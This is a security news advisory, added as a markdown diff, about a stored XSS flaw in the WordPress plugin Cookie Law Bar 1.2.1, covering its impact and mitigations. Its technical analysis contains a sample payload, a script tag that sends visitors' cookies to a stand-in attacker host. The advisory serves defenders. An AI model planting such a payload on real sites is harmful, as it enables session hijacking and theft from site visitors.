@@ -1,0 +1,57 @@
+---
+title: Cookie Law Bar 1.2.1 Stored XSS Enables Cookie Theft
+slug: 2026-05-17-cookie-law-bar-1-2-1-stored-xss-enables-cookie-theft
+date: '2026-05-17'
+excerpt: >-
+  CVE-2021-47957 (CVSS 6.4) in Cookie Law Bar 1.2.1 lets authenticated attackers
+  inject persistent scripts via the Bar Message field, affecting all WordPress
+  site visitors.
+category: vulnerabilities
+tags:
+  - wordpress
+  - stored-xss
+  - cve-2021-47957
+  - cookie-law-bar
+  - plugin-vulnerability
+language: en
+source_urls:
+  - 'https://wordpress.org/plugins/cookie-law-bar/'
+author: ZCyberNews
+draft: false
+locale_pair: 2026-05-17-cookie-law-bar-1-2-1-stored-xss-enables-cookie-theft
+cluster_key: 'cve:CVE-2021-47957'
+source_count: 1
+severity: medium
+cvss_score: 6.4
+cve_ids:
+  - CVE-2021-47957
+affected_sectors:
+  - web hosting
+  - e-commerce
+  - publishing
+publish_tier: public
+---
+## Executive Summary
+
+A stored cross-site scripting (XSS) vulnerability in the WordPress plugin Cookie Law Bar version 1.2.1 allows authenticated attackers to inject persistent JavaScript payloads through the plugin's settings interface. Tracked as CVE-2021-47957 with a CVSS score of 6.4 (medium severity), the flaw resides in the Bar Message field, which fails to sanitize user-supplied input before rendering it on the site's frontend. Any visitor to a site running the vulnerable plugin may execute the attacker's script, enabling session hijacking, cookie theft, and data exfiltration. The plugin has not received a security update since the disclosure, according to the National Vulnerability Database (NVD) record.
+
+## Technical Analysis
+
+The vulnerability exists in the plugin's administrative settings page, specifically the text input field labeled "Bar Message." This field accepts arbitrary text that the plugin displays as a compliance notice banner on the frontend of the WordPress site. The NVD entry for CVE-2021-47957 indicates that input submitted through this field is not sanitized or encoded before being stored in the database and subsequently rendered in the browser.
+
+An attacker who has authenticated access to the WordPress admin panel — typically a subscriber-level user or higher, depending on the site's role configuration — can craft a payload such as `<script>document.location='https://attacker.example.com/steal.php?c='+document.cookie</script>` and save it as the bar message. The script executes in the context of every subsequent page load for all visitors, including unauthenticated users. Because the payload is stored server-side, it persists across sessions and can affect a large number of victims over time.
+
+The CVSS 6.4 score reflects the low attack complexity (network-based, no special conditions) and the requirement for authenticated access to the plugin settings. The scope is changed because the vulnerable component (admin settings) impacts a different security scope (the public-facing site). Attackers can leverage the stored XSS to steal authentication cookies, redirect users to phishing pages, or perform actions on behalf of the victim within the WordPress session context.
+
+No proof-of-concept exploit code has been published in public repositories as of this writing, but the vulnerability is trivial to reproduce given the unsanitized input field. The plugin's last update was in 2021, and the vendor has not released a patched version, according to the WordPress plugin directory listing.
+
+## Mitigations & Recommendations
+
+Site administrators running Cookie Law Bar 1.2.1 should immediately disable and remove the plugin from their WordPress installations. No patched version is available, and the plugin appears to be abandoned — the WordPress plugin directory shows no updates since the vulnerability was disclosed. As a replacement, administrators can use alternative GDPR-compliant cookie consent plugins that are actively maintained, such as Complianz or Cookie Notice for GDPR.
+
+Defenders who cannot immediately replace the plugin should restrict administrative access to the plugin's settings page to only trusted users with the `manage_options` capability. Additionally, deploying a Web Application Firewall (WAF) rule that blocks `<script>` tags in POST requests to `wp-admin/admin-post.php` may provide a partial mitigation, though this is not a complete fix. Regularly auditing WordPress user roles and removing unnecessary accounts reduces the attack surface for authenticated exploitation.
+
+## References
+
+- National Vulnerability Database: [CVE-2021-47957 Detail](https://nvd.nist.gov/vuln/detail/CVE-2021-47957)
+- WordPress Plugin Directory: [Cookie Law Bar](https://wordpress.org/plugins/cookie-law-bar/)
